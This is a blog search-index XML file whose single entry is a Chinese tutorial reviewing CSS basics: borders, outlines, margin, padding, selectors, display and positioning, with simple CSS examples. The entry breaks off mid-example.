<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WEB前端-CSS基础知识复习（三）</title>
    <link href="/2021/05/13/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/05/13/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS 指层叠样式表（Cascading Style Sheets）。通过与 XHTML 结合，CSS 可以帮助我们实行表现与结构分离的开发模式。 通过使用 CSS 来提升工作效率！<br>外部样式表通常存储在 CSS 文件中，外部样式表可以极大提高工作效率。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-边框（Border）"><a href="#1-边框（Border）" class="headerlink" title="1.边框（Border）"></a>1.边框（Border）</h2><p>CSS 边框 (border) 可以是围绕元素内容和内边距的一条或多条线，对于这些线条，您可以自定义它们的样式、宽度以及颜色。使用 CSS 边框属性，我们可以创建出比 HTML 中更加优秀的效果。</p><p>CSS边框属性允许你指定一个元素边框的样式和颜色。</p><p>边框属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">border</td><td align="center">简写属性，用于把针对四个边的属性设置在一个声明。</td></tr><tr><td align="center">border-style</td><td align="center">用于设置元素所有边框的样式，或者单独地为各边设置边框样式。</td></tr><tr><td align="center">border-width</td><td align="center">简写属性，用于为元素的所有边框设置宽度，或者单独地为各边边框设置宽度。</td></tr><tr><td align="center">border-color</td><td align="center">简写属性，设置元素的所有边框中可见部分的颜色，或为 4 个边分别设置颜色。</td></tr><tr><td align="center">border-bottom</td><td align="center">简写属性，用于把下边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-bottom-color</td><td align="center">设置元素的下边框的颜色。</td></tr><tr><td align="center">border-bottom-style</td><td align="center">设置元素的下边框的样式。</td></tr><tr><td align="center">border-bottom-width</td><td align="center">设置元素的下边框的宽度。</td></tr><tr><td align="center">border-left</td><td align="center">简写属性，用于把左边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-left-color</td><td align="center">设置元素的左边框的颜色。</td></tr><tr><td align="center">border-left-style</td><td align="center">设置元素的左边框的样式。</td></tr><tr><td align="center">border-left-width</td><td align="center">设置元素的左边框的宽度。</td></tr><tr><td align="center">border-right</td><td align="center">简写属性，用于把右边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-right-color</td><td align="center">设置元素的右边框的颜色。</td></tr><tr><td align="center">border-right-style</td><td align="center">设置元素的右边框的样式。</td></tr><tr><td align="center">border-right-width</td><td align="center">设置元素的右边框的宽度。</td></tr><tr><td align="center">border-top</td><td align="center">简写属性，用于把上边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-top-color</td><td align="center">设置元素的上边框的颜色。</td></tr><tr><td align="center">border-top-style</td><td align="center">设置元素的上边框的样式。</td></tr><tr><td align="center">border-top-width</td><td align="center">设置元素的上边框的宽度。</td></tr></tbody></table><h3 id="1-1-边框样式（border-style）"><a href="#1-1-边框样式（border-style）" class="headerlink" title="1.1 边框样式（border-style）"></a>1.1 边框样式（border-style）</h3><p>边框样式属性指定要显示什么样的边界。border-style属性用来定义边框的样式。</p><p>border-style 值:</p><blockquote><ol><li>none: 默认无边框</li><li>dotted: 定义一个点线框</li><li>dashed: 定义一个虚线框</li><li>solid: 定义实线边界</li><li>double: 定义两个边界。 两个边界的宽度和border-width的值相同</li><li>groove: 定义3D沟槽边界。效果取决于边界的颜色值</li><li>ridge: 定义3D脊边界。效果取决于边界的颜色值</li><li>inset:定义一个3D的嵌入边框。效果取决于边界的颜色值</li><li>outset: 定义一个3D突出边框。 效果取决于边界的颜色值</li></ol></blockquote><h3 id="1-2-边框宽度（border-width）"><a href="#1-2-边框宽度（border-width）" class="headerlink" title="1.2 边框宽度（border-width）"></a>1.2 边框宽度（border-width）</h3><p>可以通过 border-width 属性为边框指定宽度。为边框指定宽度有两种方法：可以指定长度值，比如 2px 或 0.1em；或者使用 3 个关键字之一，它们分别是 thin 、medium（默认值） 和 thick。</p><p><strong>注意：</strong>CSS 没有定义 3 个关键字的具体宽度，所以一个用户代理可能把 thin 、medium 和 thick 分别设置为等于 5px、3px 和 2px，而另一个用户代理则分别设置为 3px、2px 和 1px。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.one</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-width</span>:<span class="hljs-number">5px</span>;<br>&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.two</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-width</span>:medium;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-边框颜色（border-color）"><a href="#1-3-边框颜色（border-color）" class="headerlink" title="1.3 边框颜色（border-color）"></a>1.3 边框颜色（border-color）</h3><p>border-color 属性用于设置边框的颜色，它一次可以接受最多 4 个颜色值。还可以设置边框的颜色为”transparent”。</p><p>border-color 单独使用是不起作用的，必须得先使用 border-style 来设置边框样式。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.one</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-color</span>:red;<br>&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.two</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-color</span>:<span class="hljs-number">#98bf21</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-4-单独设置边框各边"><a href="#1-4-单独设置边框各边" class="headerlink" title="1.4 单独设置边框各边"></a>1.4 单独设置边框各边</h3><p>在 CSS 中，可以指定不同的侧面不同的边框：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">border-top-style</span>:dotted;<br><span class="hljs-attribute">border-right-style</span>:solid;<br><span class="hljs-attribute">border-bottom-style</span>:dotted;<br><span class="hljs-attribute">border-left-style</span>:solid;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上面的例子也可以设置一个单一属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">border-style</span>:dotted solid;<br></code></pre></div></td></tr></table></figure><p>border-style 属性可以有 1-4 个值：</p><blockquote><ol><li>border-style:dotted solid double dashed;（4个值）<br>上边框是 dotted<br>右边框是 solid<br>底边框是 double<br>左边框是 dashed</li></ol></blockquote><blockquote><ol start="2"><li>border-style:dotted solid double;（3个值）<br>上边框是 dotted<br>左、右边框是 solid<br>底边框是 double</li></ol></blockquote><blockquote><ol start="3"><li>border-style:dotted solid;（2个值）<br>上、底边框是 dotted<br>左、右边框是 solid</li></ol></blockquote><blockquote><ol start="4"><li>border-style:dotted;（1个值）<br>四面边框是 dotted</li></ol></blockquote><p>上面的例子用了 border-style。然而，它也可以和 border-width 、 border-color 一起使用。</p><h3 id="1-5-透明边框（transparent）"><a href="#1-5-透明边框（transparent）" class="headerlink" title="1.5 透明边框（transparent）"></a>1.5 透明边框（transparent）</h3><p>CSS2 引入了边框颜色值 transparent，这个值用于创建有宽度的不可见边框。</p><p>透明样式实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>, <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;    <br><span class="hljs-attribute">border-style</span>: solid; <span class="hljs-attribute">border-width</span>: <span class="hljs-number">5px</span>; <span class="hljs-attribute">border-color</span>: transparent;<br>&#125; <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">border-color</span>: gray;&#125;<br></code></pre></div></td></tr></table></figure><p>利用 transparent，使用边框就像是额外的内边距一样；此外还有一个好处，就是能在你需要的时候使其可见。这种透明边框相当于内边距，因为元素的背景会延伸到边框区域（如果有可见背景的话）。 </p><h3 id="1-6-简写属性"><a href="#1-6-简写属性" class="headerlink" title="1.6 简写属性"></a>1.6 简写属性</h3><p>上面的例子用了很多属性来设置边框。也可以在一个属性中设置边框。<br>可以在”border”属性中设置：</p><ul><li>border-width</li><li>border-style (required)</li><li>border-color</li></ul><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">border</span>:<span class="hljs-number">5px</span> solid red;<br></code></pre></div></td></tr></table></figure><h2 id="2-轮廓（outline）"><a href="#2-轮廓（outline）" class="headerlink" title="2.轮廓（outline）"></a>2.轮廓（outline）</h2><p>轮廓（outline）是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用。<br>轮廓（outline）属性指定了样式，颜色和外边框的宽度。<br>轮廓（outline）属性的位置让它不像边框那样参与到文档流中，因此轮廓出现或消失时不会影响文档流，即不会导致文档的重新显示。</p><p>轮廓（outline）是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用。<br>CSS outline 属性规定元素轮廓的样式、颜色和宽度。如图：</p><p><img src="https://img-blog.csdnimg.cn/20210513183904643.gif"></p><p>轮廓属性：</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th><th align="center">值</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">outline</td><td align="center">在一个声明中设置所有的外边框属性</td><td align="center">*outline-color outline-style outline-width *inherit</td><td align="center">2</td></tr><tr><td align="center">outline-color</td><td align="center">设置外边框的颜色</td><td align="center">*color-name hex-number rgb-number *invert inherit</td><td align="center">2</td></tr><tr><td align="center">outline-style</td><td align="center">设置外边框的样式</td><td align="center">none dotted dashed solid double groove ridge inset outset inherit</td><td align="center">2</td></tr><tr><td align="center">outline-width</td><td align="center">设置外边框的宽度</td><td align="center">thin medium thick *length *inherit</td><td align="center">2</td></tr></tbody></table><h2 id="3-外边距（Margin）"><a href="#3-外边距（Margin）" class="headerlink" title="3.外边距（Margin）"></a>3.外边距（Margin）</h2><p>CSS Margin (外边距)属性定义元素周围的空间。CSS Margin 属性接受任何长度单位、百分数值甚至负值。</p><p>margin 清除周围的元素（外边框）的区域。margin 没有背景颜色，是完全透明的。margin 可以单独改变元素的上，下，左，右边距。也可以一次改变所有的属性。</p><h2 id="4-填充（Padding）"><a href="#4-填充（Padding）" class="headerlink" title="4.填充（Padding）"></a>4.填充（Padding）</h2><p>CSS Padding（填充）属性定义元素边框与元素内容之间的空间。当元素的 Padding（填充）（内边距）被清除时，所”释放”的区域将会受到元素背景颜色的填充。单独使用填充属性可以改变上下左右的填充。缩写填充属性也可以使用，一旦改变一切都改变。</p><p>CSS padding 属性可以使用长度值或百分比值，但与 margin 属性不同，它不允许使用负值。</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">padding</td><td align="center">使用缩写属性设置在一个声明中的所有填充属性</td></tr><tr><td align="center">padding-bottom</td><td align="center">设置元素的底部填充</td></tr><tr><td align="center">padding-left</td><td align="center">设置元素的左部填充</td></tr><tr><td align="center">padding-right</td><td align="center">设置元素的右部填充</td></tr><tr><td align="center">padding-top</td><td align="center">设置元素的顶部填充</td></tr></tbody></table><h3 id="4-1-内边距的百分比数值"><a href="#4-1-内边距的百分比数值" class="headerlink" title="4.1 内边距的百分比数值"></a>4.1 内边距的百分比数值</h3><p>CSS padding 属性的百分比数值是相对于其父元素的 width 计算的，如果改变了父元素的 width，则它们也会改变。</p><p>使用实例：段落的内边距设置为父元素 width 的 20% </p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">20%</span>;&#125;<br></code></pre></div></td></tr></table></figure><p>如果一个段落的父元素是 div 元素，那么它的 padding 的 width 计算是根据 div 进行的：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;div style=&quot;width: 200px;&quot;&gt;        <br>&lt;<span class="hljs-selector-tag">p</span>&gt;这个段落包含在一个宽度为<span class="hljs-number">200</span>像素的<span class="hljs-selector-tag">DIV</span>中。&lt;/<span class="hljs-selector-tag">p</span>&gt;    <br>&lt;/<span class="hljs-selector-tag">div</span>&gt;<br></code></pre></div></td></tr></table></figure><p>上下内边距与左右内边距一致，即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。</p><h3 id="4-2-单边内边距属性"><a href="#4-2-单边内边距属性" class="headerlink" title="4.2 单边内边距属性"></a>4.2 单边内边距属性</h3><p>在CSS中，可以指定不同的侧面不同的填充：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">padding-top</span>:<span class="hljs-number">25px</span>;<br><span class="hljs-attribute">padding-bottom</span>:<span class="hljs-number">25px</span>;<br><span class="hljs-attribute">padding-right</span>:<span class="hljs-number">50px</span>;<br><span class="hljs-attribute">padding-left</span>:<span class="hljs-number">50px</span>;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-简写属性"><a href="#4-3-简写属性" class="headerlink" title="4.3 简写属性"></a>4.3 简写属性</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">padding</span>:<span class="hljs-number">25px</span> <span class="hljs-number">50px</span>;<br></code></pre></div></td></tr></table></figure><p>Padding 属性，可以有一到四个值：</p><blockquote><ol><li>padding:25px 50px 75px 100px;（4个值）<br>上填充为25px<br>右填充为50px<br>下填充为75px<br>左填充为100px</li></ol></blockquote><blockquote><ol start="2"><li>padding:25px 50px 75px;（3个值）<br>上填充为25px<br>左右填充为50px<br>下填充为75px</li></ol></blockquote><blockquote><ol start="3"><li>padding:25px 50px;（2个值）<br>上下填充为25px<br>左右填充为50px</li></ol></blockquote><blockquote><ol start="4"><li>padding:25px;（1个值）<br>所有的填充都是25px</li></ol></blockquote><h2 id="5-分组和嵌套"><a href="#5-分组和嵌套" class="headerlink" title="5.分组和嵌套"></a>5.分组和嵌套</h2><p>CSS 分组可以将具有相同样式的选择器进行分组，减少代码量。</p><p>CSS 嵌套适用于选择器内部的选择器的样式。</p><h3 id="5-1-分组选择器"><a href="#5-1-分组选择器" class="headerlink" title="5.1 分组选择器"></a>5.1 分组选择器</h3><p>在样式表中有很多具有相同样式的元素。为了尽量减少代码，可以使用分组选择器。每个选择器用逗号分隔。</p><p>如正常样式：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>&#123;<br>    <span class="hljs-attribute">color</span>:green;<br>&#125;<br><span class="hljs-selector-tag">h2</span>&#123;<br>    <span class="hljs-attribute">color</span>:green;<br>&#125;<br><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">color</span>:green;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>对上面代码采用分组选择器：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>,<span class="hljs-selector-tag">h2</span>,<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>:green;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以对任意多个选择器进行分组，CSS 对此没有任何限制。</p><h3 id="5-2-嵌套选择器"><a href="#5-2-嵌套选择器" class="headerlink" title="5.2 嵌套选择器"></a>5.2 嵌套选择器</h3><p>可能适用于选择器内部的选择器的样式。</p><p>实例：为所有 p 元素指定一个样式，为所有元素指定一个 class=”marked”的样式，并仅用于class=”marked”，类内的 p 元素指定第三个样式：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>:blue;<br><span class="hljs-attribute">text-align</span>:center;<br>&#125;<br><span class="hljs-selector-class">.marked</span>&#123;<br><span class="hljs-attribute">background-color</span>:red;<br>&#125;<br><span class="hljs-selector-class">.marked</span> <span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>:white;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="6-尺寸（Dimension）"><a href="#6-尺寸（Dimension）" class="headerlink" title="6.尺寸（Dimension）"></a>6.尺寸（Dimension）</h2><p>CSS 尺寸 (Dimension) 属性允许控制元素的高度和宽度。同样，允许增加行间距。</p><p>尺寸属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">height</td><td align="center">设置元素的高度。</td></tr><tr><td align="center">line-height</td><td align="center">设置行高。</td></tr><tr><td align="center">max-height</td><td align="center">设置元素的最大高度。</td></tr><tr><td align="center">max-width</td><td align="center">设置元素的最大宽度。</td></tr><tr><td align="center">min-height</td><td align="center">设置元素的最小高度。</td></tr><tr><td align="center">min-width</td><td align="center">设置元素的最小宽度。</td></tr><tr><td align="center">width</td><td align="center">设置元素的宽度。</td></tr></tbody></table><h2 id="7-显示（Display）与可见性（Visibility）"><a href="#7-显示（Display）与可见性（Visibility）" class="headerlink" title="7.显示（Display）与可见性（Visibility）"></a>7.显示（Display）与可见性（Visibility）</h2><p>CSS display 属性和 visibility 属性都可以用来隐藏某个元素，但是这两个属性有不同的定义。display 属性设置一个元素应如何显示，visibility 属性指定一个元素应可见还是隐藏。</p><h3 id="7-1-隐藏元素（display-none-或-visibility-hidden）"><a href="#7-1-隐藏元素（display-none-或-visibility-hidden）" class="headerlink" title="7.1 隐藏元素（display:none 或 visibility:hidden）"></a>7.1 隐藏元素（display:none 或 visibility:hidden）</h3><p>隐藏一个元素可以通过把 display 属性设置为”none”，或把 visibility 属性设置为”hidden”。但是请注意，这两种方法会产生不同的结果。</p><p>visibility:hidden 可以隐藏某个元素，但隐藏的元素 <span style="color:green">仍需占用与未隐藏之前一样的空间</span> 。也就是说，该元素虽然被隐藏了，但仍然会影响布局。</p><p>display:none 可以隐藏某个元素，且隐藏的元素 <span style="color:green">不会占用任何空间</span> 。也就是说，该元素不但被隐藏了，而且该元素原本占用的空间也会从页面布局中消失。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span> &#123;<span class="hljs-attribute">visibility</span>:hidden;&#125;<br><br><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span> &#123;<span class="hljs-attribute">display</span>:none;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-2-块和内联元素"><a href="#7-2-块和内联元素" class="headerlink" title="7.2 块和内联元素"></a>7.2 块和内联元素</h3><p>块元素是一个元素，占用了全部宽度，在前后都是换行符。即会单独占据一行。<br>如：h1、p、div 等。</p><p>内联元素只需要必要的宽度，不强制换行。即不是单独占据一行。可以在后面继续放其他元素。<br>如：span、a 等。</p><h3 id="7-3-更改内联元素为块元素"><a href="#7-3-更改内联元素为块元素" class="headerlink" title="7.3 更改内联元素为块元素"></a>7.3 更改内联元素为块元素</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">span</span> &#123;<span class="hljs-attribute">display</span>:block;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-4-更改内块元素为内联元素"><a href="#7-4-更改内块元素为内联元素" class="headerlink" title="7.4 更改内块元素为内联元素"></a>7.4 更改内块元素为内联元素</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> &#123;<span class="hljs-attribute">display</span>:inline;&#125;<br></code></pre></div></td></tr></table></figure><p>变更元素的显示类型看该元素是如何显示，它是什么样的元素。例如：一个内联元素设置为 display:block 是不允许有它内部的嵌套块元素。</p><h2 id="8-定位（Positioning）"><a href="#8-定位（Positioning）" class="headerlink" title="8.定位（Positioning）"></a>8.定位（Positioning）</h2><p>CSS position 属性，允许将布局的一部分与另一部分重叠。<br>CSS 定位属性允许为一个元素定位。也可以将一个元素放在另一个元素后面，并指定一个元素的内容太大时，应该发生什么。</p><p>元素可以使用的顶部，底部，左侧和右侧属性定位。然而，这些属性无法工作，除非事先设定 position 属性。他们也有不同的工作方式，这取决于定位方法.</p><p>有四种不同的定位方法：Static 定位、Fixed 定位、Relative 定位、Absolute 定位。</p><p>定位属性：</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th><th align="center">值</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">bottom</td><td align="center">定义了定位元素下外边距边界与其包含块下边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">clip</td><td align="center">剪辑一个绝对定位的元素</td><td align="center">*shape *auto inherit</td><td align="center">2</td></tr><tr><td align="center">cursor</td><td align="center">显示光标移动到指定的类型</td><td align="center"><em>url</em> auto crosshair default pointer move e-resize ne-resize nw-resize n-resize se-resize sw-resize s-resize w-resize text wait help</td><td align="center">2</td></tr><tr><td align="center">left</td><td align="center">定义了定位元素左外边距边界与其包含块左边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">overflow</td><td align="center">设置当元素的内容溢出其区域时发生的事情。</td><td align="center">auto hidden scroll visible inherit</td><td align="center">2</td></tr><tr><td align="center">position</td><td align="center">指定元素的定位类型</td><td align="center">absolute fixed relative static inherit</td><td align="center">2</td></tr><tr><td align="center">right</td><td align="center">定义了定位元素右外边距边界与其包含块右边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">top</td><td align="center">定义了一个定位元素的上外边距边界与其包含块上边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">z-index</td><td align="center">设置元素的堆叠顺序</td><td align="center">*number *auto inherit</td><td align="center">2</td></tr></tbody></table><h3 id="8-1-Static-定位"><a href="#8-1-Static-定位" class="headerlink" title="8.1 Static 定位"></a>8.1 Static 定位</h3><p>HTML 元素的默认值，即没有定位，元素出现在正常的流中。静态定位的元素不会受到 top, bottom, left, right 影响。</p><h3 id="8-2-Fixed-定位"><a href="#8-2-Fixed-定位" class="headerlink" title="8.2 Fixed 定位"></a>8.2 Fixed 定位</h3><p>元素的位置相对于浏览器窗口是固定位置。即使窗口是滚动的它也不会移动：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.pos_fixed</span>&#123;<br><span class="hljs-attribute">position</span>:fixed;<br><span class="hljs-attribute">top</span>:<span class="hljs-number">30px</span>;<br><span class="hljs-attribute">right</span>:<span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Fixed 定位使元素的位置与文档流无关，因此不占据空间。Fixed 定位的元素和其他元素重叠。</p><h3 id="8-3-Relative-定位"><a href="#8-3-Relative-定位" class="headerlink" title="8.3 Relative 定位"></a>8.3 Relative 定位</h3><p>相对定位元素的定位是相对其正常位置。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span><span class="hljs-selector-class">.pos_left</span>&#123;<br><span class="hljs-attribute">position</span>:relative;<br><span class="hljs-attribute">left</span>:-<span class="hljs-number">20px</span>;<br>&#125;<br><span class="hljs-selector-tag">h2</span><span class="hljs-selector-class">.pos_right</span>&#123;<br><span class="hljs-attribute">position</span>:relative;<br><span class="hljs-attribute">left</span>:<span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以移动的相对定位元素的内容和相互重叠的元素，它原本所占的空间不会改变。<br>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span><span class="hljs-selector-class">.pos_top</span>&#123;<br><span class="hljs-attribute">position</span>:relative;<br><span class="hljs-attribute">top</span>:-<span class="hljs-number">50px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>相对定位元素经常被用来作为绝对定位元素的容器块。</p><h3 id="8-4-Absolute-定位"><a href="#8-4-Absolute-定位" class="headerlink" title="8.4 Absolute 定位"></a>8.4 Absolute 定位</h3><p>绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于 &lt;html&gt;：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span>&#123;<br><span class="hljs-attribute">position</span>:absolute;<br><span class="hljs-attribute">left</span>:<span class="hljs-number">100px</span>;<br><span class="hljs-attribute">top</span>:<span class="hljs-number">150px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Absolutely 定位使元素的位置与文档流无关，因此不占据空间。Absolutely 定位的元素和其他元素重叠。</p><h3 id="8-5-重叠的元素"><a href="#8-5-重叠的元素" class="headerlink" title="8.5 重叠的元素"></a>8.5 重叠的元素</h3><p>元素的定位与文档流无关，所以它们可以覆盖页面上的其它元素。z-index 属性指定了一个元素的堆叠顺序（哪个元素应该放在前面，或后面），具有更高堆叠顺序的元素总是在较低的堆叠顺序元素的前面。一个元素可以有正数或负数的堆叠顺序：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br><span class="hljs-attribute">position</span>:absolute;<br><span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>;<br><span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;<br><span class="hljs-attribute">z-index</span>:-<span 